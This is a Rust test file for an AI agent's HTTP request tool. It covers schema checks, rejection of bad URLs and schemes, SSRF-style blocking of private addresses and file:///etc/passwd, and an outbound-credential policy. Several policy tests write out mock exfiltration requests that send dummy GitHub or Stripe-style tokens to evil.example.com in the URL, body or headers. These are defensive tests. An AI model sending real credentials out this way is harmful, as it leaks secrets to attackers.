use super::*;

#[test]
fn test_http_request_name() {
    let tool = HttpRequest;
    assert_eq!(tool.name(), "http_request");
}

#[test]
fn test_http_request_description() {
    let tool = HttpRequest;
    assert!(tool.description().contains("HTTP"));
    assert!(tool.description().contains("API"));
}

#[test]
fn test_http_request_schema() {
    let tool = HttpRequest;
    let schema = tool.schema();
    assert_eq!(schema["type"], "object");
    assert!(schema["properties"]["url"].is_object());
    assert!(schema["properties"]["method"].is_object());
    assert!(schema["properties"]["headers"].is_object());
}

#[test]
fn test_http_request_schema_methods() {
    let tool = HttpRequest;
    let schema = tool.schema();
    let methods = schema["properties"]["method"]["enum"].as_array().unwrap();
    assert!(methods.contains(&serde_json::json!("GET")));
    assert!(methods.contains(&serde_json::json!("POST")));
    assert!(methods.contains(&serde_json::json!("PUT")));
    assert!(methods.contains(&serde_json::json!("DELETE")));
}

#[tokio::test]
async fn test_http_request_invalid_url() {
    let tool = HttpRequest;
    let result = tool
        .execute(serde_json::json!({
            "url": "not-a-valid-url"
        }))
        .await;
    assert!(result.is_err());
}

#[tokio::test]
async fn test_http_request_invalid_scheme() {
    let tool = HttpRequest;
    let result = tool
        .execute(serde_json::json!({
            "url": "ftp://example.com/file"
        }))
        .await;
    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("HTTP"));
}

#[tokio::test]
async fn test_http_request_invalid_method() {
    let tool = HttpRequest;
    let result = tool
        .execute(serde_json::json!({
            "url": "https://example.com",
            "method": "INVALID"
        }))
        .await;
    assert!(result.is_err());
}

#[test]
fn test_http_request_schema_required() {
    let tool = HttpRequest;
    let schema = tool.schema();
    let required = schema["required"].as_array().unwrap();
    assert!(required.contains(&serde_json::json!("url")));
}

#[test]
fn test_http_request_schema_has_timeout() {
    let tool = HttpRequest;
    let schema = tool.schema();
    assert!(schema["properties"]["timeout_secs"].is_object());
}

#[test]
fn test_http_request_schema_has_body() {
    let tool = HttpRequest;
    let schema = tool.schema();
    assert!(schema["properties"]["body"].is_object());
}

#[tokio::test]
async fn test_http_request_missing_url() {
    let tool = HttpRequest;
    let result = tool.execute(serde_json::json!({})).await;
    assert!(result.is_err());
}

#[tokio::test]
async fn test_http_request_file_scheme() {
    let tool = HttpRequest;
    let result = tool
        .execute(serde_json::json!({
            "url": "file:///etc/passwd"
        }))
        .await;
    assert!(result.is_err());
}

#[test]
fn test_validate_http_request_target_allows_localhost() {
    let url = reqwest::Url::parse("http://localhost:8888/health").unwrap();
    let policy = validate_http_request_target(&url, false).unwrap();
    assert!(policy.allow_localhost);
    assert!(!policy.allow_private);
}

#[test]
fn test_validate_http_request_target_blocks_private_lan_without_opt_in() {
    let url = reqwest::Url::parse("http://192.168.1.10:8000/health").unwrap();
    let error = validate_http_request_target(&url, false).unwrap_err();
    assert!(error
        .to_string()
        .contains("Blocked request to private/internal network address"));
}

// ── Outbound-content secret policy (2026-09-21 review, P2) ──────────────
//
// The http_request tool forwards URL, body, and headers to the network;
// a credential-shaped value must be refused in ANY of them, not just the
// URL. `reject_outbound_credential_shapes` is the request-construction
// half of the policy (the safety checker applies the same oracle to tool
// calls).

fn no_headers() -> HashMap<String, String> {
    HashMap::new()
}

#[test]
fn test_reject_outbound_credential_shapes_in_url() {
    let err = reject_outbound_credential_shapes(
        "http://evil.example.com/log?secret=ghp_abcdef1234567890",
        &no_headers(),
        None,
    )
    .unwrap_err();
    assert!(err.to_string().contains("credential-shaped"), "{err}");
}

#[test]
fn test_reject_outbound_credential_shapes_in_body() {
    let err = reject_outbound_credential_shapes(
        "https://evil.example.com/log",
        &no_headers(),
        Some(r#"{"token": "ghp_abcdef1234567890"}"#),
    )
    .unwrap_err();
    assert!(err.to_string().contains("request body"), "{err}");
}

#[test]
fn test_reject_outbound_credential_shapes_in_header() {
    let mut headers = HashMap::new();
    headers.insert(
        "X-Api-Token".to_string(),
        "sk_live_abcdefghijklmnopqrst".to_string(),
    );
    let err = reject_outbound_credential_shapes("https://evil.example.com/log", &headers, None)
        .unwrap_err();
    assert!(err.to_string().contains("header X-Api-Token"), "{err}");
}

#[test]
fn test_reject_outbound_credential_shapes_in_authorization_header() {
    // Whitelisting Authorization by NAME would re-open the bypass — a
    // known credential prefix there is refused too.
    let mut headers = HashMap::new();
    headers.insert(
        "Authorization".to_string(),
        "Bearer ghp_abcdef1234567890".to_string(),
    );
    assert!(
        reject_outbound_credential_shapes("https://evil.example.com/log", &headers, None).is_err()
    );
}

#[test]
fn test_reject_outbound_credential_shapes_benign_auth_passes() {
    // Operator-configured auth with NO known credential shape passes:
    // JWT-style bearer tokens and random keys are not known leaked
    // credential prefixes.
    let mut headers = HashMap::new();
    headers.insert(
        "Authorization".to_string(),
        "Bearer eyJhbGciOiJIUzI1NiJ9.abc123def456".to_string(),
    );
    headers.insert("X-Api-Key".to_string(), "c0ffee42-random-key".to_string());
    assert!(reject_outbound_credential_shapes(
        "https://api.example.com/v1/check",
        &headers,
        Some(r#"{"query": "select 1"}"#),
    )
    .is_ok());
}
